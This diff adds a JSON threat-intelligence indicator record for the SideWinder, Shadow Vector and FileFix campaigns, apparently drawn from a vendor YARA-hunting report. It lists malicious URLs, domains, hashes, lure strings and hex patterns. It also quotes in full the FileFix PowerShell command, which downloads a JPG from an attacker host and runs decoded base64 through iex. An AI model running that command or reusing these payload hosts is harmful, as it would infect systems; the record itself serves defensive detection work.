@@ -1,0 +1,473 @@
+{
+  "malware_family": "FileFix (ClickFix variant), Shadow Vector",
+  "threat_actor": "SideWinder; Blind Eagle (suspected, not conclusively attributed, for Shadow Vector)",
+  "platforms": [
+    "windows",
+    "web"
+  ],
+  "summary": "Acronis TRU used VirusTotal Livehunt/retrohunt YARA hunting to track three campaigns: SideWinder's South Asian maldoc chain abusing CVE-2017-0199/CVE-2017-11882 with geofenced empty-RTF decoys, the Colombian Shadow Vector campaign using judicial-themed SVG lures with embedded HTTPS payload links, and the FileFix ClickFix variant that copies a PowerShell command to the clipboard and extracts an executable from a downloaded JPG. Detection anchors include the SideWinder decoy RTF hash and hex patterns, the Spanish judicial lure strings plus the 'Generado Automaticamente' generator marker in SVGs, and the clipboard-copy JavaScript/PowerShell deobfuscation chain used by FileFix.",
+  "mitre_techniques": [
+    "T1203",
+    "T1204.001",
+    "T1204.002"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "Font_Updates.rtf",
+      "context": "SideWinder empty decoy RTF downloaded from geofenced URLs (VT UI shows Font_Updates.rft)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "MSFT_CLD_Font.rtf",
+      "context": "SideWinder decoy RTF variant hosted on nomination.army-bd.com",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Documentation_EULA.rtf",
+      "context": "8-byte empty RTF decoy served over HTTPS by SideWinder infrastructure",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Default\\Documents\\Meta\\Facebook\\Shared\\Identity.pdf",
+      "context": "Masquerade path the FileFix payload instructs the victim to paste into Explorer",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "54th CISM World Military Naval Pentathlon 2025 - Invitation.eml",
+      "context": "SideWinder spear-phishing email recovered via VT file relations",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Generado Automaticamente",
+      "context": "Marker string in Shadow Vector SVGs hinting at automated/batch generation",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "juzgado",
+      "context": "Judicial lure keyword in Shadow Vector SVG YARA rule",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "citacion",
+      "context": "Judicial lure keyword in Shadow Vector SVG YARA rule",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "despacho",
+      "context": "Judicial lure keyword in Shadow Vector SVG YARA rule",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "COPIA",
+      "context": "Legal/judicial term in Colombian SVG hunting rule",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DEMANDA",
+      "context": "Legal/judicial term in Colombian SVG hunting rule",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "P3g4wQZi",
+      "context": "Password displayed in SVG lure for the Bitbucket-hosted archive",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Internet Connection Error",
+      "context": "Wscript.Shell Popup message used by second-stage PowerShell as masquerade",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "PowerShell -nop -W h -ep Bypass -c \"$if=[System.IO.File]::ifr=$if::ReadAllBytes;$ifw=$if::WriteAllBytes;$e=[System.Text.Encoding]::UTF8;$c=[System.Convert]::gph=$e.GetBytes;$egs=$e.GetString;$cf=$c::FromBase64String;$ct=$c::ToBase64String;$u='https://thanjainatural.com/temp/zl3a70fc9675.jpg';$egs.Invoke($cf.Invoke('JH5e169zaXp1PTk3MTgyOGRyYWQ2c309LPWvbavzuROX2zc3cQ09LwpVavzu0MmY1O2FkbWluLW4ZVs4ZDhjbHNmbxN2jeGejEyYTc0wYMJ5Njclc9wclm1e0S8GT6Ji3FJR12PVU5EIGIRICRuxZp3cQp0w0kaWh1Z2VYfn1o2xM9IGlmcm1c3bnZva2U6aHBfZm1zdCdkZ7JHBfYfn1o2XM9GiLtYwdlX2J5dGV2WzK2MTY0LjG1Ywdlx25dGV2Lxk1bmd0aC04MDgZNDMzMDpxTSxZSS5HZxRzdHjbpmc0HBFYfn1oZXMpfG1leD=='))|iex\"",
+      "context": "FileFix webpage payload (parent: browser) downloading a JPG and running embedded script",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(",
+      "context": "Base64-decode chain used as pivot for related FileFix payloads",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "navigator.clipboard.writeText",
+      "context": "Clipboard-copy JavaScript in *Fix lure pages",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "document.execCommand(\"copy\")",
+      "context": "Clipboard-copy JavaScript hunted in *Fix lure pages",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "navigator.platform.toLowerCase().includes('mac')",
+      "context": "macOS branch selecting a different base64 clipboard payload in FileFix page",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "f3aa24",
+      "context": "RC4 key-scheduling/PRGA routine in decrypted second-stage PowerShell",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{62544CB1F0B9E6E04433698E85BFB534278B9BDC5F06589C011E9CB80C71DF23}",
+      "context": "YARA $a1 matching SideWinder CVE-2017-0199 malicious documents",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{E20F76CDABDFAB004A6BA632F20CE00512BA5AD2FE8FB6ED9EE1865DFD07504B0304140000}",
+      "context": "YARA $a2 matching SideWinder CVE-2017-0199 malicious documents",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "24733d302e32353235",
+      "context": "VT content search used to locate FileFix payload files",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "support@modgov.co",
+      "context": "Sender address of SideWinder spear-phishing email (recipient 55div@army.lk)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://www-customs-gov-lk.net-co.info/89691407/MicrosoftWordDocumentFile/Documentation_EULA.rtf",
+      "context": "Serves 8-byte empty RTF decoy to non-targeted visitors",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "www-customs-gov-lk.net-co.info",
+      "context": "SideWinder resource-hosting domain resolving to 185.123.102.139",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.123.102.139",
+      "context": "IP behind www-customs-gov-lk.net-co.info decoy delivery",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://transitionpage.info/",
+      "context": "FileFix lure page hosting obfuscated clipboard payload",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://thanjainatural.com/temp/zl3a70fc9675.jpg",
+      "context": "Second-stage image containing the decrypted executable, fetched by PowerShell",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://thanjainatural.com/z/",
+      "context": "Path used to enumerate additional malicious .jpg payloads",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://bitbucket.org/elpolidd/doras/downloads/01_Documentos_de_la_demanda_juzgado_penal_de_control_de_garantias_4.zip?id=84f32da5-df54-4d3e-9641-d335289ee0a7",
+      "context": "Password-protected archive linked from Shadow Vector court-summon SVG lure",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://pmo-gov-pk.loadpath.info/17456/1/30457/2/32/0/0/m/files-9967ca15/Font_Updates.rtf",
+      "context": "ITW URL delivering SideWinder decoy RTF",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://pmo-gov-pk.snagdrive.com/17441/1/38669/2/32/0/0/m/files-8e4de920/Font_Updates.rtf",
+      "context": "ITW URL delivering SideWinder decoy RTF",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://saarc-sec-org.snagdrive.com/17290/1/30128/2/32/0/0/m/files-80442c33/Font_Updates.rtf",
+      "context": "ITW URL delivering SideWinder decoy RTF",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://hsia-gov-bd.download-doc.net/17239/1/38619/2/32/0/0/m/files-dfd473f9/Font_Updates.rtf",
+      "context": "ITW URL delivering SideWinder decoy RTF",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://caapakistan-gov-pk.download-doc.net/17176/1/27803/2/32/0/0/m/files-d1fd9f32/Font_Updates.rtf",
+      "context": "ITW URL delivering SideWinder decoy RTF",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://sco.mail163cn.info/5153/1/98470/2/32/0/0/m/files-79e37580/Font_Updates.rtf",
+      "context": "ITW URL delivering SideWinder decoy RTF",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://nomination.army-bd.com/5134/1/56007/2/32/0/0/m/files-2ebfe974/MSFT_CLD_Font.rtf",
+      "context": "ITW URL delivering SideWinder MSFT_CLD_Font.rtf decoy",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "nomination.army-bd.com",
+      "context": "SideWinder lure-hosting domain for MSFT_CLD_Font.rtf decoys",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pmo-gov-pk.loadpath.info",
+      "context": "SideWinder lure-hosting domain for Font_Updates.rtf decoys",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "saarc-sec-org.snagdrive.com",
+      "context": "SideWinder lure-hosting domain for Font_Updates.rtf decoys",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/m/files-9967ca15/Font_Updates.rtf",
+      "context": "URL path pattern used by SideWinder delivery servers",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "1955c6914097477d5141f720c9e8fa44b4fe189e854da298d85090cbc338b35a",
+      "description": "SideWinder empty RTF decoy returned by geofenced delivery servers (use as hunting pivot)"
+    },
+    {
+      "sha256": "6d4a53da259c3c8c0903b1345efcf2fa0d50bc10c3c010a34f86263de466f5a1",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash1)"
+    },
+    {
+      "sha256": "2aae8e206dd068135b16ff87dfbb816053fc247a222aad0d34c9227e6ecf7b5b",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash2)"
+    },
+    {
+      "sha256": "4cfeab122e0a748c8600ccd14a186292f27a93b5ba74c58dfee838fe28765061",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash3)"
+    },
+    {
+      "sha256": "9bbbcb6eae33314b84f5e367f90e57f487d6abe72d6067adcb66eba896d7ce33",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash4)"
+    },
+    {
+      "sha256": "60e87c0fe7c3904935bb1604bdb0b0fc0f2919db64f72666b77405c2c1e46067",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash5)"
+    },
+    {
+      "sha256": "609edc93e075223c5dc8caaf076bf4e28f81c5c6e4db0eb6f502dda91500aab4",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash6)"
+    },
+    {
+      "sha256": "4795d3a3e776baf485d284a9edcf1beef29da42cad8e8261a83e86d35b25cafe",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash7)"
+    },
+    {
+      "sha256": "5673ad3287bcc0c8746ab6cab6b5e1b60160f07c7b16c018efa56bffd44b37aa",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash8)"
+    },
+    {
+      "sha256": "b3e8ab81d0a559a373c3fe2ae7c3c99718503411cc13b17cffd1eee2544a787b",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash9)"
+    },
+    {
+      "sha256": "b5311cadc0bbd2f47549f7fc0895848adb20cc016387cebcd1c29d784779240c",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash10)"
+    },
+    {
+      "sha256": "c3319a8863d5e2dc525dfe6669c5b720fc42c96a8dce3bd7f6a0072569933303",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash11)"
+    },
+    {
+      "sha256": "cb035f440f728395cc4237e1ac52114641dc25619705b605713ecefb6fd9e563",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash12)"
+    },
+    {
+      "sha256": "cf23f7b98abddf1b36552b55f874ae1e2199768d7cefb0188af9ee0d9a698107",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash13)"
+    },
+    {
+      "sha256": "f3208ae62655435186e560378db58e133a68aa6107948e2a8ec30682983aa503",
+      "description": "Manually verified Shadow Vector malicious SVG (rule hash14)"
+    },
+    {
+      "sha256": "06471e1f500612f44c828e5d3453e7846f70c2d83b24c08ac9193e791f1a8130",
+      "description": "FileFix malicious JPG image (VT query on thanjainatural.com/z/)"
+    },
+    {
+      "sha256": "85c22daf06b42a6c81db9e958aee4a8ad8c061984c8c8933ec525fe880141063",
+      "description": "Shadow Vector judicial-themed SVG lure (Denuncia laboral fiscal juzgado civil penal)"
+    },
+    {
+      "sha256": "06ae4560425ad72ea46be727c0f16362d9fc49f9ab19008e559449e997d59bf0",
+      "description": "Shadow Vector judicial-themed SVG lure variant"
+    }
+  ],
+  "file_types": [
+    "document",
+    "script",
+    "pe",
+    "archive",
+    "unknown"
+  ]
+}
